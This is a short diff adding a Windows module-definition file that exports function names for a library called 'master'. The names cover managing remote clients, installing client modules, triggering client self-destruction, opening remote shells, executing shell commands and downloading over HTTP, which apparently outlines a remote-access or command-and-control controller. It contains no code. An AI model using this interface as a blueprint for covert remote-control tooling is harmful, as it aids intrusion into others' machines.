@@ -1,0 +1,33 @@
+LIBRARY "master"
+
+EXPORTS
+	GetMasterLastError		@1
+	GetMasterErrorMsg		@2
+	ListAvailableClients	@3
+	ListModules				@4
+
+	SetClientInfoNotifies	@5
+	StartMasterWorking		@6
+
+	InstallClientModule		@7
+	ListAvailableClientModules	@8
+	MakeClientSelfDestruction	@9
+	GetClientInfo			@10
+	SendMessage2Client		@11
+	GetReplyByMsgserialid	@12
+	RegisterCommMsgHandler	@13
+	QuerySendingMessageStatus	@14
+	QueryFileTransferInfo		@15
+
+	QueryModuleInstallStatus	@17
+	StopMasterWorking			@18
+
+	ListDisks				@19
+	ListFiles				@20
+	AsynListFiles			@21
+	AsynListDisks			@22
+
+	OpenShell				@23
+	ExecuteShellCommand		@24
+	CloseShell				@25
+	HttpDownLoad			@26
